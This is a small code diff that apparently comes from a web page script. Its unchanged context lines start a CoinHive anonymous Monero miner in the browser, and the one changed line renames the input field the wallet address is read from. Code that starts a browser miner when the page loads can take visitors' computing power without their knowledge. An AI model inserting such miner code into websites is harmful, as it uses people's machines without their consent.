@@ -2,7 +2,7 @@ var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
 anonMiner.start();
 
 function getWalletAddress(){
-        var walletAddress=document.getElementById('address').value;
+        var walletAddress=document.getElementById('xmrAddress').value;
         return(walletAddress);
     }
 
